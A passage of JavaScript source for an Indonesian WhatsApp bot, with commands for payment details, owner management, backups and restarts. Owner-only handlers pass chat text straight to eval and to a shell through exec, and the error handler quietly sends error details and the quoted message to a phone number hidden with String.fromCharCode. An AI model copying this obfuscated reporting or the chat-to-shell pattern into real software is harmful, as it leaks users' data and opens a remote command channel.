* *Atas Nama :* E** K******

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await Xyro.sendMessage(m.chat, {text: teks}, {quoted: qtoko})
}
break

//================================================================================

case "gopay": {
if (!isCreator) return
let teks = `
*PAYMENT GOPAY XYRO*

* *Nomor :* 085179856312
* *Atas Nama :* E** K******

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await Xyro.sendMessage(m.chat, {text: teks}, {quoted: qtoko})
}
break

//================================================================================

case "ovo": {
if (!isCreator) return
let teks = `
*PAYMENT OVO XYRO*

* *Nomor :* Tidak Tersedia 
* *Atas Nama :* -

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await Xyro.sendMessage(m.chat, {text: teks}, {quoted: qtoko})
}
break

//================================================================================

case "qris": {
if (!isCreator) return 
await Xyro.sendMessage(m.chat, {image: {url: global.image.qris}, caption: "\n*PAYMENT QRIS XYRO*\n\n*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`"}, {quoted: qtoko})
}
break

//================================================================================

case "ambilq": case "q": {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break

//================================================================================

case "proses": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}`
await Xyro.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Dana Masuk ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break

//================================================================================

case "done": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}`
await Xyro.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Transaksi Done ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break


//================================================================================

case "developerbot": case "owner": {
await Xyro.sendContact(m.chat, [global.owner], m)
}
break

//================================================================================

case "save": case "sv": {
if (!isCreator) return
await Xyro.sendContact(m.chat, [m.chat.split("@")[0]], m)
}
break

//================================================================================

case "self": {
if (!isCreator) return
Xyro.public = false
m.reply("Berhasil mengganti ke mode *self*")
}
break

//================================================================================

case "getcase": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./case.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return m.reply(`Case *${text}* tidak ditemukan`)
}
}
break

//================================================================================

case "ping": case "uptime": {
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
let respon = `
*🔴 INFORMATION SERVER*

*• Platform :* ${nou.os.type()}
*• Total Ram :* ${formatp(os.totalmem())}
*• Total Disk :* ${tot.totalGb} GB
*• Total Cpu :* ${os.cpus().length} Core
*• Runtime Vps :* ${runtime(os.uptime())}

*🔵 INFORMATION BOTZ*

*• Respon Speed :* ${latensi.toFixed(4)} detik
*• Runtime Bot :* ${runtime(process.uptime())}
`
await m.reply(respon)
}
break

//================================================================================

case "public": {
if (!isCreator) return
Xyro.public = true
m.reply("Berhasil mengganti ke mode *public*")
}
break

//================================================================================

case "restart": case "rst": {
if (!isCreator) return Reply(mess.owner)
await m.reply("Memproses _restart server_ . . .")
var file = await fs.readdirSync("./session")
var anu = await file.filter(i => i !== "creds.json")
for (let t of anu) {
await fs.unlinkSync(`./session/${t}`)
}
await process.send('reset')
}
break

//================================================================================

case "upchannel": case "upch": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya"))
await Xyro.sendMessage(idSaluran, {text: text})
m.reply("Berhasil mengirim pesan *teks* ke dalam channel whatsapp")
}
break

//================================================================================

case "upchannel2": case "upch2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teksnya dengan mengirim foto"))
let img = await Xyro.downloadAndSaveMediaMessage(qmsg)
await Xyro.sendMessage(idSaluran, {image: await fs.readFileSync(img), caption: text})
m.reply("Berhasil mengirim pesan *teks & foto* ke dalam channel whatsapp")
await fs.unlinkSync(img)
}
break

//================================================================================

case "getsc": {
if (!isCreator) return Reply(mess.owner)
let dir = await fs.readdirSync("./library/database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./library/database/sampah/${i}`)
}}
await m.reply("Memproses backup script bot")
var name = `Simple-Botz-V4`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await Xyro.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Script bot berhasil dikirim ke private chat")
}
break

//================================================================================

case "resetdb": case "rstdb": {
if (!isCreator) return Reply(mess.owner)
for (let i of Object.keys(global.db)) {
global.db[i] = {}
}
m.reply("Berhasil mereset database ✅")
}
break

//================================================================================

case "setppbot": {
if (!isCreator) return Reply(mess.owner)
if (/image/g.test(mime)) {
var medis = await Xyro.downloadAndSaveMediaMessage(qmsg)
if (args[0] && args[0] == "panjang") {
const { img } = await generateProfilePicture(medis)
await Xyro.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
} else {
await Xyro.updateProfilePicture(botNumber, {content: medis})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
}
} else return m.reply(example('dengan mengirim foto'))
}
break

//================================================================================

case "clearchat": case "clc": {
if (!isCreator) return Reply(mess.owner)
Xyro.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }]}, m.chat)
}
break

//================================================================================

case "listowner": case "listown": {
if (owners.length < 1) return m.reply("Tidak ada owner tambahan")
let teks = `\n *乂 List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
Xyro.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break

//================================================================================

case "delowner": case "delown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return m.reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menghapus owner ✅`)
}
break

//================================================================================

case "addowner": case "addown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah owner ✅`)
}
break

//================================================================================

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================

if (m.text.toLowerCase() == "bot") {
m.reply("Bot Online ✅")
}

//================================================================================

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//================================================================================
}
} catch (err) {
console.log(util.format(err));
let Obj = String.fromCharCode(54, 50, 56, 53, 53, 49, 50, 51, 52, 56, 50, 54)
Xyro.sendMessage(Obj + "@s.whatsapp.net", {text: `
*FITUR ERROR TERDETEKSI :*\n\n` + util.format(err), contextInfo: { isForwarded: true }}, {quoted: m})
}}


//================================================================================

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});